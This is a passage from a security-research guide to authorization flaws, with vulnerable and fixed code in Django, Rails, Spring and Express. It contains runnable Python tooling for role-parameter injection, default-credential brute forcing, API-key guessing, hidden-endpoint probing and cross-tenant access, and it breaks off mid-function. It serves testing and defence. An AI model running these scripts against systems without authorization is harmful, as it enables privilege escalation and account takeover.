# Permission & Role Vulnerabilities - Security Research Documentation

## Overview

Permission and role vulnerabilities represent a critical class of security flaws where applications fail to properly enforce authorization constraints. These vulnerabilities can lead to unauthorized access, privilege escalation, and data breaches across single-tenant and multi-tenant environments.

**Related CWEs:**
- CWE-269: Improper Privilege Management
- CWE-862: Missing Authorization
- CWE-863: Incorrect Authorization
- CWE-1220: Insufficient Granularity of Access Control

---

## 1. Role Manipulation

### 1.1 Parameter Tampering

Role parameter tampering occurs when applications rely on client-supplied data to determine user roles without proper server-side validation.

#### Common Attack Vectors

```http
# Registration Role Injection
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "SecurePass123!",
  "role": "admin",
  "is_admin": true,
  "user_type": "administrator"
}

# Profile Update Role Escalation
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer user_token

{
  "name": "Attacker",
  "role_id": 1,
  "roles": ["admin", "superadmin"],
  "permissions": ["*"],
  "access_level": 10
}

# Hidden Form Field Manipulation
POST /update-settings HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Attacker&email=attacker@evil.com&_role=admin&account_type=premium
```

#### Framework-Specific Vulnerabilities

```python
# Django - Mass Assignment Vulnerability
# Vulnerable code
class UserProfileSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserProfile
        fields = '__all__'  # DANGEROUS: Exposes all fields including role

# Secure implementation
class UserProfileSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserProfile
        fields = ['name', 'email', 'avatar']  # Whitelist safe fields
        read_only_fields = ['role', 'is_admin', 'permissions']
```

```ruby
# Rails - Strong Parameters Bypass
# Vulnerable controller
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(params[:user].permit!)  # DANGEROUS: Permits all params
  end
end

# Secure implementation
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(user_params)
  end

  private

  def user_params
    params.require(:user).permit(:name, :email, :avatar)
    # Never permit :role, :admin, :permissions
  end
end
```

```java
// Spring Boot - Mass Assignment
// Vulnerable DTO
public class UserDTO {
    private String username;
    private String email;
    private String role;  // Should not be updatable by user
    private boolean admin;  // Should not be updatable by user

    // Getters and setters for all fields - DANGEROUS
}

// Secure DTO with validation
public class UserUpdateDTO {
    @NotBlank
    private String username;

    @Email
    private String email;

    // No role or admin fields - users cannot modify these
}

// Controller with proper binding
@PutMapping("/users/{id}")
public ResponseEntity<?> updateUser(
    @PathVariable Long id,
    @Valid @RequestBody UserUpdateDTO dto,  // Limited DTO
    @AuthenticationPrincipal User currentUser
) {
    // Additional authorization check
    if (!currentUser.getId().equals(id) && !currentUser.isAdmin()) {
        return ResponseEntity.status(403).build();
    }
    return userService.update(id, dto);
}
```

```javascript
// Express.js - Unvalidated Input
// Vulnerable route
app.put('/api/users/:id', authenticate, async (req, res) => {
    const user = await User.findByIdAndUpdate(
        req.params.id,
        req.body,  // DANGEROUS: Accepts any field
        { new: true }
    );
    res.json(user);
});

// Secure implementation
const allowedFields = ['name', 'email', 'avatar'];

app.put('/api/users/:id', authenticate, async (req, res) => {
    // Filter to allowed fields only
    const updates = Object.keys(req.body)
        .filter(key => allowedFields.includes(key))
        .reduce((obj, key) => {
            obj[key] = req.body[key];
            return obj;
        }, {});

    // Authorization check
    if (req.params.id !== req.user.id && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    const user = await User.findByIdAndUpdate(req.params.id, updates, { new: true });
    res.json(user);
});
```

#### Automated Parameter Tampering Script

```python
import requests
import json
from itertools import product

class RoleParameterTamper:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }

        # Common role-related parameters
        self.role_params = [
            'role', 'roles', 'role_id', 'roleId', 'role_ids',
            'admin', 'is_admin', 'isAdmin', 'administrator',
            'user_type', 'userType', 'type', 'account_type',
            'privilege', 'privileges', 'priv', 'level',
            'access_level', 'accessLevel', 'permission_level',
            'group', 'groups', 'group_id', 'groupId',
            'permissions', 'perms', 'permission_ids',
            'staff', 'is_staff', 'isStaff',
            'superuser', 'is_superuser', 'isSuperuser',
            'moderator', 'is_moderator', 'isModerator',
            'verified', 'is_verified', 'trusted',
            'internal', 'is_internal', 'employee'
        ]

        # Values to test
        self.role_values = [
            'admin', 'administrator', 'root', 'superadmin',
            'super', 'superuser', 'system', 'internal',
            True, 1, '1', 'true', 'yes',
            ['admin'], ['admin', 'user'],
            {'role': 'admin'}, 0, '0'  # 0 might be admin in some systems
        ]

    def test_registration(self, endpoint, base_payload):
        """Test role injection during registration"""
        vulnerabilities = []

        for param in self.role_params:
            for value in self.role_values:
                test_payload = base_payload.copy()
                test_payload[param] = value

                try:
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        headers={'Content-Type': 'application/json'},
                        json=test_payload,
                        timeout=10
                    )

                    if response.status_code in [200, 201]:
                        # Check if role was assigned
                        resp_data = response.json()
                        if self._check_role_escalation(resp_data, param, value):
                            vulnerabilities.append({
                                'endpoint': endpoint,
                                'param': param,
                                'value': value,
                                'response': resp_data
                            })
                except Exception as e:
                    pass

        return vulnerabilities

    def test_profile_update(self, endpoint):
        """Test role escalation via profile update"""
        vulnerabilities = []

        for param in self.role_params:
            for value in self.role_values:
                test_payload = {param: value}

                try:
                    # Test PUT
                    response = requests.put(
                        f"{self.base_url}{endpoint}",
                        headers=self.headers,
                        json=test_payload,
                        timeout=10
                    )
                    self._analyze_response(response, 'PUT', endpoint, param, value, vulnerabilities)

                    # Test PATCH
                    response = requests.patch(
                        f"{self.base_url}{endpoint}",
                        headers=self.headers,
                        json=test_payload,
                        timeout=10
                    )
                    self._analyze_response(response, 'PATCH', endpoint, param, value, vulnerabilities)

                except Exception as e:
                    pass

        return vulnerabilities

    def _check_role_escalation(self, response_data, param, value):
        """Check if the response indicates successful role escalation"""
        indicators = ['admin', 'administrator', 'superuser', 'staff']

        response_str = json.dumps(response_data).lower()
        for indicator in indicators:
            if indicator in response_str:
                return True

        # Check if injected param appears in response
        if param in str(response_data):
            return True

        return False

    def _analyze_response(self, response, method, endpoint, param, value, vulnerabilities):
        """Analyze response for potential vulnerabilities"""
        if response.status_code == 200:
            try:
                resp_data = response.json()
                if self._check_role_escalation(resp_data, param, value):
                    vulnerabilities.append({
                        'method': method,
                        'endpoint': endpoint,
                        'param': param,
                        'value': value,
                        'response': resp_data
                    })
            except:
                pass


# Usage
tamper = RoleParameterTamper("https://target.com", "user_jwt_token")
reg_vulns = tamper.test_registration("/api/register", {
    "username": "testuser",
    "email": "test@test.com",
    "password": "Test123!"
})
profile_vulns = tamper.test_profile_update("/api/users/me")
```

### 1.2 Hidden Role Discovery

Hidden roles are internal or undocumented roles that may have elevated privileges.

#### Discovery Techniques

```bash
# JavaScript/API Response Analysis
# Look for role enumerations in:
# - JavaScript bundles
# - API error messages
# - Swagger/OpenAPI documentation
# - GraphQL introspection

# Extract role names from JavaScript
curl -s https://target.com/bundle.js | grep -oP "role['\"]?\s*[=:]\s*['\"]?\w+" | sort -u

# Check API documentation
curl -s https://target.com/api/swagger.json | jq '.definitions.User.properties.role'
curl -s https://target.com/api/openapi.json | jq '.'

# GraphQL role enumeration
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"Role\") { enumValues { name } } }"}'
```

```python
# Hidden Role Discovery Script
import requests
import re
import json

class HiddenRoleDiscovery:
    def __init__(self, base_url):
        self.base_url = base_url

        # Common role names to search for
        self.common_roles = [
            'admin', 'administrator', 'superadmin', 'super_admin',
            'root', 'system', 'internal', 'support', 'helpdesk',
            'moderator', 'mod', 'editor', 'publisher', 'author',
            'manager', 'supervisor', 'lead', 'owner',
            'developer', 'dev', 'tester', 'qa',
            'billing', 'finance', 'accounting', 'sales',
            'hr', 'human_resources', 'executive', 'c_level',
            'readonly', 'viewer', 'guest', 'anonymous',
            'api', 'service', 'bot', 'integration',
            'partner', 'vendor', 'reseller', 'affiliate'
        ]

    def scan_javascript(self, js_urls):
        """Scan JavaScript files for role definitions"""
        found_roles = set()

        patterns = [
            r"role['\"]?\s*[=:]\s*['\"](\w+)['\"]",
            r"ROLE_(\w+)",
            r"hasRole\(['\"](\w+)['\"]",
            r"role\s*===?\s*['\"](\w+)['\"]",
            r"userType['\"]?\s*[=:]\s*['\"](\w+)['\"]",
            r"permission['\"]?\s*[=:]\s*['\"](\w+)['\"]",
            r"enum\s+Role\s*\{([^}]+)\}",
            r"roles:\s*\[([^\]]+)\]"
        ]

        for url in js_urls:
            try:
                response = requests.get(url, timeout=10)
                content = response.text

                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    found_roles.update(matches)
            except:
                pass

        return found_roles

    def check_graphql_schema(self, graphql_endpoint):
        """Extract roles from GraphQL introspection"""
        introspection_query = """
        {
          __schema {
            types {
              name
              enumValues { name }
              fields {
                name
                type { name enumValues { name } }
              }
            }
          }
        }
        """

        try:
            response = requests.post(
                graphql_endpoint,
                json={'query': introspection_query},
                timeout=10
            )
            data = response.json()

            roles = set()
            # Parse introspection for role-related types
            for type_def in data.get('data', {}).get('__schema', {}).get('types', []):
                type_name = type_def.get('name', '').lower()
                if 'role' in type_name or 'permission' in type_name:
                    if type_def.get('enumValues'):
                        for enum in type_def['enumValues']:
                            roles.add(enum['name'])

            return roles
        except:
            return set()

    def probe_role_endpoints(self, auth_token):
        """Probe for hidden role-related endpoints"""
        endpoints_to_check = [
            '/api/roles',
            '/api/v1/roles',
            '/api/admin/roles',
            '/api/user/roles',
            '/api/permissions',
            '/api/groups',
            '/api/internal/roles',
            '/api/system/roles',
            '/admin/roles',
            '/roles.json',
            '/permissions.json'
        ]

        found_endpoints = []
        headers = {'Authorization': f'Bearer {auth_token}'} if auth_token else {}

        for endpoint in endpoints_to_check:
            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    timeout=5
                )
                if response.status_code in [200, 403]:  # 403 means endpoint exists
                    found_endpoints.append({
                        'endpoint': endpoint,
                        'status': response.status_code,
                        'data': response.text[:500] if response.status_code == 200 else None
                    })
            except:
                pass

        return found_endpoints

    def test_role_assignment(self, endpoint, auth_token):
        """Test assigning discovered roles"""
        results = []

        for role in self.common_roles:
            payloads = [
                {'role': role},
                {'role_name': role},
                {'roles': [role]},
                {'user_role': role}
            ]

            for payload in payloads:
                try:
                    response = requests.put(
                        f"{self.base_url}{endpoint}",
                        headers={
                            'Authorization': f'Bearer {auth_token}',
                            'Content-Type': 'application/json'
                        },
                        json=payload,
                        timeout=10
                    )

                    if response.status_code == 200:
                        results.append({
                            'role': role,
                            'payload': payload,
                            'response': response.json()
                        })
                except:
                    pass

        return results
```

### 1.3 Role Hierarchy Bypass

Role hierarchy bypass occurs when users can access functionality of roles above them in the hierarchy.

```python
# Role Hierarchy Bypass Testing
class RoleHierarchyBypass:
    def __init__(self, base_url):
        self.base_url = base_url

        # Typical role hierarchy (top to bottom)
        self.role_hierarchy = [
            'superadmin',
            'admin',
            'manager',
            'moderator',
            'editor',
            'user',
            'guest'
        ]

    def test_function_access(self, low_priv_token, functions_by_role):
        """
        Test if lower privilege roles can access higher privilege functions

        functions_by_role: dict mapping roles to their allowed functions
        Example: {'admin': ['/admin/users', '/admin/settings'], 'user': ['/profile']}
        """
        vulnerabilities = []

        headers = {'Authorization': f'Bearer {low_priv_token}'}

        # Get current user's role
        current_role = self._get_user_role(low_priv_token)
        current_role_index = self.role_hierarchy.index(current_role)

        # Test access to higher privilege functions
        for role, functions in functions_by_role.items():
            role_index = self.role_hierarchy.index(role) if role in self.role_hierarchy else -1

            # Only test roles above current user
            if role_index < current_role_index:
                for func in functions:
                    for method in ['GET', 'POST', 'PUT', 'DELETE']:
                        response = requests.request(
                            method,
                            f"{self.base_url}{func}",
                            headers=headers,
                            timeout=10
                        )

                        if response.status_code in [200, 201, 204]:
                            vulnerabilities.append({
                                'function': func,
                                'method': method,
                                'required_role': role,
                                'actual_role': current_role,
                                'status': response.status_code
                            })

        return vulnerabilities

    def test_role_inheritance(self, admin_token, user_token):
        """Test if role inheritance is properly enforced"""

        # First, discover what admin can access
        admin_endpoints = self._probe_endpoints(admin_token)

        # Then test if user can access the same
        vulnerabilities = []
        user_headers = {'Authorization': f'Bearer {user_token}'}

        for endpoint in admin_endpoints:
            response = requests.get(
                f"{self.base_url}{endpoint['path']}",
                headers=user_headers,
                timeout=10
            )

            if response.status_code == 200:
                vulnerabilities.append({
                    'endpoint': endpoint['path'],
                    'admin_status': endpoint['status'],
                    'user_status': response.status_code,
                    'issue': 'User can access admin endpoint'
                })

        return vulnerabilities

    def _get_user_role(self, token):
        """Extract role from JWT or API"""
        import jwt
        try:
            # Try to decode JWT without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            return decoded.get('role', 'unknown')
        except:
            return 'unknown'

    def _probe_endpoints(self, token):
        """Probe common endpoints to find accessible ones"""
        common_paths = [
            '/api/admin', '/api/admin/users', '/api/admin/settings',
            '/api/admin/logs', '/api/admin/config', '/api/system',
            '/api/internal', '/api/debug', '/api/management'
        ]

        accessible = []
        headers = {'Authorization': f'Bearer {token}'}

        for path in common_paths:
            try:
                response = requests.get(
                    f"{self.base_url}{path}",
                    headers=headers,
                    timeout=5
                )
                if response.status_code == 200:
                    accessible.append({'path': path, 'status': response.status_code})
            except:
                pass

        return accessible
```

### 1.4 Default Role Exploitation

Default roles often have overly permissive settings or known credentials.

```python
# Default Role Exploitation
class DefaultRoleExploit:
    def __init__(self, base_url):
        self.base_url = base_url

        # Common default accounts
        self.default_accounts = [
            {'username': 'admin', 'passwords': ['admin', 'Admin123', 'administrator', 'password', '123456']},
            {'username': 'administrator', 'passwords': ['administrator', 'admin', 'Admin123!']},
            {'username': 'root', 'passwords': ['root', 'toor', 'Root123', 'password']},
            {'username': 'system', 'passwords': ['system', 'System123', 'manager']},
            {'username': 'test', 'passwords': ['test', 'Test123', 'testing']},
            {'username': 'demo', 'passwords': ['demo', 'Demo123', 'demonstration']},
            {'username': 'guest', 'passwords': ['guest', 'Guest123', '']},
            {'username': 'user', 'passwords': ['user', 'User123', 'password']},
            {'username': 'support', 'passwords': ['support', 'Support123', 'helpdesk']},
            {'username': 'service', 'passwords': ['service', 'Service123', 'svc123']},
        ]

        # Default API keys/tokens
        self.default_tokens = [
            'admin', 'administrator', 'secret', 'password',
            'development', 'test', 'demo', 'default',
            'changeme', 'placeholder', 'example'
        ]

    def test_default_credentials(self, login_endpoint):
        """Test for default credentials"""
        found = []

        for account in self.default_accounts:
            for password in account['passwords']:
                response = requests.post(
                    f"{self.base_url}{login_endpoint}",
                    json={
                        'username': account['username'],
                        'password': password
                    },
                    timeout=10
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'token' in data or 'session' in data or 'access' in data:
                            found.append({
                                'username': account['username'],
                                'password': password,
                                'response': data
                            })
                    except:
                        pass

        return found

    def test_default_api_keys(self, protected_endpoints):
        """Test for default API keys"""
        found = []

        for endpoint in protected_endpoints:
            for token in self.default_tokens:
                headers_to_try = [
                    {'Authorization': f'Bearer {token}'},
                    {'Authorization': f'Basic {token}'},
                    {'X-API-Key': token},
                    {'Api-Key': token},
                    {'X-Auth-Token': token},
                    {'Token': token}
                ]

                for headers in headers_to_try:
                    response = requests.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        timeout=5
                    )

                    if response.status_code == 200:
                        found.append({
                            'endpoint': endpoint,
                            'token': token,
                            'header': list(headers.keys())[0]
                        })

        return found

    def check_registration_defaults(self, register_endpoint):
        """Check what default role new users get"""
        test_user = {
            'username': f'test_user_{int(time.time())}',
            'email': f'test_{int(time.time())}@test.com',
            'password': 'TestPassword123!'
        }

        response = requests.post(
            f"{self.base_url}{register_endpoint}",
            json=test_user,
            timeout=10
        )

        if response.status_code in [200, 201]:
            data = response.json()
            return {
                'default_role': data.get('role'),
                'permissions': data.get('permissions'),
                'is_admin': data.get('is_admin'),
                'user_data': data
            }

        return None
```

---

## 2. Permission Bypass

### 2.1 Missing Permission Checks

Missing permission checks occur when endpoints or functions lack proper authorization verification.

#### Detection Methodology

```python
# Missing Permission Check Scanner
import requests
from concurrent.futures import ThreadPoolExecutor
import time

class PermissionCheckScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def compare_authenticated_vs_unauthenticated(self, endpoints):
        """Find endpoints accessible without authentication"""
        vulnerabilities = []

        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint['path']}"
            method = endpoint.get('method', 'GET')

            # Test without authentication
            unauth_response = self.session.request(
                method, url, timeout=10
            )

            if unauth_response.status_code == 200:
                vulnerabilities.append({
                    'endpoint': endpoint['path'],
                    'method': method,
                    'issue': 'No authentication required',
                    'status': unauth_response.status_code
                })

        return vulnerabilities

    def compare_user_vs_admin_access(self, endpoints, user_token, admin_token):
        """Find endpoints where user can access admin functions"""
        vulnerabilities = []

        user_headers = {'Authorization': f'Bearer {user_token}'}
        admin_headers = {'Authorization': f'Bearer {admin_token}'}

        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint['path']}"
            method = endpoint.get('method', 'GET')

            # Test as admin first
            admin_response = self.session.request(
                method, url, headers=admin_headers, timeout=10
            )

            if admin_response.status_code == 200:
                # Now test as regular user
                user_response = self.session.request(
                    method, url, headers=user_headers, timeout=10
                )

                if user_response.status_code == 200:
                    # Compare responses to see if same data is returned
                    if self._responses_similar(admin_response, user_response):
                        vulnerabilities.append({
                            'endpoint': endpoint['path'],
                            'method': method,
                            'issue': 'User can access admin endpoint',
                            'admin_status': admin_response.status_code,
                            'user_status': user_response.status_code
                        })

        return vulnerabilities

    def test_http_method_bypass(self, endpoint, auth_token):
        """Test if different HTTP methods bypass permission checks"""
        headers = {'Authorization': f'Bearer {auth_token}'}
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']

        results = {}
        for method in methods:
            try:
                response = self.session.request(
                    method,
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    timeout=5
                )
                results[method] = response.status_code
            except:
                results[method] = 'Error'

        # Check for inconsistencies
        if results.get('GET') == 403 and any(
            results.get(m) == 200 for m in ['POST', 'PUT', 'PATCH']
        ):
            return {
                'endpoint': endpoint,
                'issue': 'Method-based permission bypass',
                'results': results
            }

        return None

    def _responses_similar(self, resp1, resp2):
        """Check if two responses return similar data"""
        try:
            data1 = resp1.json()
            data2 = resp2.json()
            # Simple check - compare keys
            if isinstance(data1, dict) and isinstance(data2, dict):
                return set(data1.keys()) == set(data2.keys())
            return True
        except:
            return len(resp1.text) == len(resp2.text)
```

#### Framework-Specific Missing Checks

```python
# Django - Missing @login_required
# Vulnerable
def sensitive_view(request):
    # No authentication check!
    return render(request, 'sensitive.html', {'data': SensitiveData.objects.all()})

# Secure
from django.contrib.auth.decorators import login_required, permission_required

@login_required
@permission_required('app.view_sensitivedata', raise_exception=True)
def sensitive_view(request):
    return render(request, 'sensitive.html', {'data': SensitiveData.objects.all()})
```

```ruby
# Rails - Missing before_action
# Vulnerable
class AdminController < ApplicationController
  def users
    @users = User.all  # No authentication check!
  end
end

# Secure
class AdminController < ApplicationController
  before_action :authenticate_user!
  before_action :require_admin!

  def users
    @users = User.all
  end

  private

  def require_admin!
    unless current_user.admin?
      redirect_to root_path, alert: 'Not authorized'
    end
  end
end
```

```java
// Spring Boot - Missing @PreAuthorize
// Vulnerable
@RestController
public class AdminController {
    @GetMapping("/api/admin/users")
    public List<User> getAllUsers() {
        return userRepository.findAll();  // No authorization!
    }
}

// Secure
@RestController
@PreAuthorize("hasRole('ADMIN')")
public class AdminController {
    @GetMapping("/api/admin/users")
    public List<User> getAllUsers() {
        return userRepository.findAll();
    }
}
```

```javascript
// Express.js - Missing Middleware
// Vulnerable
app.get('/api/admin/users', async (req, res) => {
    const users = await User.find();  // No auth check!
    res.json(users);
});

// Secure
const requireAdmin = (req, res, next) => {
    if (!req.user || !req.user.isAdmin) {
        return res.status(403).json({ error: 'Admin required' });
    }
    next();
};

app.get('/api/admin/users', authenticate, requireAdmin, async (req, res) => {
    const users = await User.find();
    res.json(users);
});
```

### 2.2 Client-Side Enforcement

Client-side enforcement vulnerabilities occur when applications only check permissions in the frontend.

#### Detection Techniques

```javascript
// Browser Console - Bypass Client-Side Checks
// Look for permission checks in JavaScript
// Common patterns to search in DevTools Sources:

// Pattern 1: Conditional rendering
if (user.role === 'admin') {
    showAdminPanel();
}
// Bypass: Directly call showAdminPanel() in console

// Pattern 2: Button disabled state
document.querySelector('#adminButton').disabled = !isAdmin;
// Bypass: document.querySelector('#adminButton').disabled = false

// Pattern 3: Route guards (React/Angular/Vue)
// Check if admin routes are defined in router configuration
// Access them directly via URL

// Pattern 4: API calls blocked by frontend
if (!hasPermission('admin')) return;
await api.deleteUser(userId);
// Bypass: Make direct API call using fetch/XHR
```

```python
# Automated Client-Side Bypass Detection
import requests
from bs4 import BeautifulSoup
import re

class ClientSideBypassDetector:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {auth_token}'}

    def find_hidden_actions(self, page_url):
        """Find hidden or disabled UI elements that might have API endpoints"""
        response = requests.get(page_url, headers=self.headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        hidden_elements = []

        # Find hidden buttons/links
        for elem in soup.find_all(['button', 'a', 'input']):
            if elem.get('disabled') or elem.get('hidden') or \
               'hidden' in elem.get('class', []) or \
               'disabled' in elem.get('class', []) or \
               elem.get('style', '').find('display: none') != -1:

                action = elem.get('data-action') or elem.get('href') or \
                        elem.get('data-url') or elem.get('formaction')

                if action:
                    hidden_elements.append({
                        'element': elem.name,
                        'action': action,
                        'id': elem.get('id'),
                        'class': elem.get('class')
                    })

        return hidden_elements

    def find_frontend_permission_checks(self, js_urls):
        """Find permission checks that might only be frontend"""
        patterns = [
            r"if\s*\(\s*user\.role\s*===?\s*['\"](\w+)['\"]\s*\)",
            r"if\s*\(\s*isAdmin\s*\)",
            r"hasPermission\(['\"](\w+)['\"]\)",
            r"canAccess\(['\"](\w+)['\"]\)",
            r"user\.permissions\.includes\(['\"](\w+)['\"]\)",
            r"route\.meta\.requiresAuth",
            r"\.disabled\s*=\s*!",
            r"v-if=['\"].*admin.*['\"]",  # Vue
            r"\*ngIf=['\"].*admin.*['\"]",  # Angular
            r"\{.*&&.*<.*Admin",  # React JSX
        ]

        checks_found = []

        for url in js_urls:
            response = requests.get(url, timeout=10)
            content = response.text

            for pattern in patterns:
                matches = re.findall(pattern, content)
                if matches:
                    checks_found.append({
                        'url': url,
                        'pattern': pattern,
                        'matches': matches[:5]  # Limit matches
                    })

        return checks_found

    def test_hidden_endpoints(self, endpoints):
        """Test if hidden endpoints are actually protected on backend"""
        results = []

        for endpoint in endpoints:
            for method in ['GET', 'POST', 'PUT', 'DELETE']:
                try:
                    response = requests.request(
                        method,
                        f"{self.base_url}{endpoint['action']}",
                        headers=self.headers,
                        timeout=5
                    )

                    if response.status_code == 200:
                        results.append({
                            'endpoint': endpoint['action'],
                            'method': method,
                            'status': response.status_code,
                            'issue': 'Hidden endpoint accessible - possible client-side only check'
                        })
                except:
                    pass

        return results
```

### 2.3 Permission Caching Issues

Permission caching can lead to stale permissions being used.

```python
# Permission Caching Vulnerability Testing
import requests
import time

class PermissionCachingTest:
    def __init__(self, base_url, admin_token, user_token):
        self.base_url = base_url
        self.admin_headers = {'Authorization': f'Bearer {admin_token}'}
        self.user_headers = {'Authorization': f'Bearer {user_token}'}

    def test_permission_revocation_delay(self, admin_endpoint, user_id):
        """
        Test if permission changes take effect immediately
        1. Grant permission to user
        2. Verify access
        3. Revoke permission
        4. Check if access persists (caching issue)
        """
        results = []

        # Step 1: Grant permission
        grant_response = requests.post(
            f"{self.base_url}/api/admin/users/{user_id}/permissions",
            headers=self.admin_headers,
            json={'permission': 'admin_access'},
            timeout=10
        )

        # Step 2: Verify access works
        access_response = requests.get(
            f"{self.base_url}{admin_endpoint}",
            headers=self.user_headers,
            timeout=10
        )
        results.append({
            'step': 'after_grant',
            'status': access_response.status_code
        })

        # Step 3: Revoke permission
        revoke_response = requests.delete(
            f"{self.base_url}/api/admin/users/{user_id}/permissions/admin_access",
            headers=self.admin_headers,
            timeout=10
        )

        # Step 4: Test access immediately after revocation
        immediate_response = requests.get(
            f"{self.base_url}{admin_endpoint}",
            headers=self.user_headers,
            timeout=10
        )
        results.append({
            'step': 'immediate_after_revoke',
            'status': immediate_response.status_code
        })

        # Step 5: Test after various delays
        for delay in [1, 5, 10, 30, 60]:
            time.sleep(delay)
            delayed_response = requests.get(
                f"{self.base_url}{admin_endpoint}",
                headers=self.user_headers,
                timeout=10
            )
            results.append({
                'step': f'after_{delay}s_delay',
                'status': delayed_response.status_code
            })

            # If access is denied, caching has expired
            if delayed_response.status_code == 403:
                break

        return results

    def test_token_permission_persistence(self, admin_endpoint, new_user_creds):
        """
        Test if token continues to work after permission changes
        1. Login and get token with permissions
        2. Modify user permissions (via admin)
        3. Check if old token still has old permissions
        """

        # Login and get token
        login_response = requests.post(
            f"{self.base_url}/api/auth/login",
            json=new_user_creds,
            timeout=10
        )
        original_token = login_response.json().get('token')
        original_headers = {'Authorization': f'Bearer {original_token}'}

        # Check initial access
        initial_access = requests.get(
            f"{self.base_url}{admin_endpoint}",
            headers=original_headers,
            timeout=10
        )

        # Modify permissions via admin
        # ... admin changes user's role/permissions ...

        # Test if original token still works with old permissions
        # This is especially relevant for JWTs where permissions are embedded
        final_access = requests.get(
            f"{self.base_url}{admin_endpoint}",
            headers=original_headers,
            timeout=10
        )

        return {
            'initial_status': initial_access.status_code,
            'final_status': final_access.status_code,
            'vulnerability': initial_access.status_code != final_access.status_code
        }
```

### 2.4 Inherited Permission Vulnerabilities

```python
# Inherited Permission Testing
class InheritedPermissionTest:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {auth_token}'}

    def test_resource_permission_inheritance(self, parent_resource, child_resource):
        """
        Test if child resources properly inherit parent permissions
        Example: User has access to folder but should they access all files in it?
        """
        results = {}

        # Check parent access
        parent_response = requests.get(
            f"{self.base_url}{parent_resource}",
            headers=self.headers,
            timeout=10
        )
        results['parent'] = {
            'resource': parent_resource,
            'status': parent_response.status_code
        }

        # Check child access
        child_response = requests.get(
            f"{self.base_url}{child_resource}",
            headers=self.headers,
            timeout=10
        )
        results['child'] = {
            'resource': child_resource,
            'status': child_response.status_code
        }

        # Analyze
        if parent_response.status_code == 403 and child_response.status_code == 200:
            results['vulnerability'] = 'Child accessible when parent is not'
        elif parent_response.status_code == 200 and child_response.status_code == 200:
            results['note'] = 'Both accessible - verify this is intended'

        return results

    def test_group_permission_inheritance(self, user_token, group_endpoints):
        """
        Test if user inherits permissions from all groups they belong to
        Look for permission accumulation issues
        """
        headers = {'Authorization': f'Bearer {user_token}'}
        results = []

        for endpoint in group_endpoints:
            response = requests.get(
                f"{self.base_url}{endpoint['path']}",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                results.append({
                    'endpoint': endpoint['path'],
                    'required_group': endpoint.get('required_group'),
                    'status': response.status_code,
                    'note': 'User has access - check if they should via group membership'
                })

        return results

    def test_role_permission_accumulation(self, user_id, admin_token):
        """
        Test if assigning multiple roles accumulates permissions incorrectly
        """
        admin_headers = {'Authorization': f'Bearer {admin_token}'}

        # Assign conflicting roles
        roles_to_assign = ['viewer', 'editor', 'admin']
        permissions_after_each = []

        for role in roles_to_assign:
            # Assign role
            requests.post(
                f"{self.base_url}/api/admin/users/{user_id}/roles",
                headers=admin_headers,
                json={'role': role},
                timeout=10
            )

            # Check user's current permissions
            perms_response = requests.get(
                f"{self.base_url}/api/admin/users/{user_id}/permissions",
                headers=admin_headers,
                timeout=10
            )

            permissions_after_each.append({
                'assigned_role': role,
                'current_permissions': perms_response.json() if perms_response.status_code == 200 else None
            })

        return permissions_after_each
```

---

## 3. Multi-Tenancy Issues

### 3.1 Tenant Isolation Bypass

```python
# Tenant Isolation Testing
class TenantIsolationTest:
    def __init__(self, base_url, tenant_a_token, tenant_b_token):
        self.base_url = base_url
        self.tenant_a_headers = {'Authorization': f'Bearer {tenant_a_token}'}
        self.tenant_b_headers = {'Authorization': f'Bearer {tenant_b_token}'}

    def test_cross_tenant_data_access(self, resource_endpoints):
        """Test if tenant A can access tenant B's data"""
        vulnerabilities = []

        for endpoint in resource_endpoints:
            # First, get tenant B's resource IDs
            tenant_b_response = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.tenant_b_headers,
                timeout=10
            )

            if tenant_b_response.status_code == 200:
                tenant_b_data = tenant_b_response.json()

                # Extract IDs from tenant B's response
                if isinstance(tenant_b_data, list):
                    for item in tenant_b_data[:5]:  # Test first 5
                        item_id = item.get('id')
                        if item_id:
                            # Try to access tenant B's item as tenant A
                            cross_tenant_response = requests.get(
                                f"{self.base_url}{endpoint}/{item_id}",
                                headers=self.tenant_a_headers,
                                timeout=10
                            )

                            if cross_tenant_response.status_code == 200:
                                vulnerabilities.append({
                                    'endpoint': f"{endpoint}/{item_id}",
                                    'tenant_b_item_id': item_id,
                                    'accessible_by_tenant_a': True,
                                    'severity': 'CRITICAL'
                                })

        return vulnerabilities

    def test_tenant_header_manipulation(self, endpoint):
        """Test if tenant can be changed via header manipulation"""
        tenant_headers_to_test = [
            'X-Tenant-ID',
            'X-Tenant',
            'Tenant-ID',
            'X-Organization-ID',
            'X-Org-ID',
            'X-Account-ID',
            'X-Company-ID',
            'X-Workspace-ID'
        ]

        vulnerabilities = []

        for header in tenant_headers_to_test:
            # Try various tenant ID values
